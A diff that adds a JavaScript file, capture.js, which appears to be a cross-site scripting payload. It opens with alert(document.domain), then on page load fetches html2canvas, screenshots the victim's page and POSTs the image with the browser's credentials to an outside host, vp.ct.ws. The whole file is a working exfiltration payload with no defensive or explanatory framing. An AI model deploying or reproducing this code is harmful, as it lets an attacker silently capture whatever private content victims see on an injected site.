@@ -1,0 +1,72 @@
+// capture.js
+alert(document.domain);
+// Function to dynamically load the html2canvas library
+function loadHtml2Canvas(callback) {
+    const script = document.createElement('script');
+    // Use the latest version of html2canvas
+    script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+    
+    // Callback function after script loads
+    script.onload = function() {
+        console.log("html2canvas library loaded successfully.");
+        callback();  // Execute the callback after loading the script
+    };
+
+    // If the script fails to load, log an error
+    script.onerror = function () {
+        console.error("Failed to load html2canvas.");
+    };
+    
+    // Append the script to the document head to load it
+    document.head.appendChild(script); 
+}
+
+// Function to capture the screenshot and send to the server
+function captureScreenshot() {
+    if (typeof html2canvas !== "undefined") {
+        // Make sure html2canvas is loaded before using it
+        html2canvas(document.body).then(function(canvas) {
+            // Convert canvas to base64 image
+            var screenshotData = canvas.toDataURL('image/png');
+            var screenshotData = screenshotData.replace(/^data:image\/png;base64,/, '');
+   
+            // Send the screenshot data to the server
+            sendScreenshot(screenshotData);
+        }).catch(function(error) {
+            console.error("Error capturing screenshot:", error);
+        });
+    } else {
+        console.error("html2canvas is not loaded.");
+    }
+}
+
+// Function to send the screenshot to the server using Fetch API (AJAX)
+function sendScreenshot(data) {
+ 
+  var scripts = document.getElementsByTagName('script');
+  var current = scripts[scripts.length - 1].src.replace("https://vp.ct.ws/","");
+  console.log(current);
+
+
+   // console.log(__filename);
+    fetch('https://vp.ct.ws/'+current, {
+        method: 'POST',
+        body: data,
+        credentials:"include"
+    })
+    .then(result => {
+        console.log('Screenshot sent successfully:', result);
+    })
+    .catch(error => {
+        console.error('Error sending screenshot:', error);
+    });
+ }
+
+// Wait for the DOM to be ready
+document.addEventListener("DOMContentLoaded", function() {
+    // Dynamically load html2canvas, then capture the screenshot
+    loadHtml2Canvas(function() {
+        // After html2canvas is loaded, capture the screenshot immediately
+        captureScreenshot();
+    });
+});
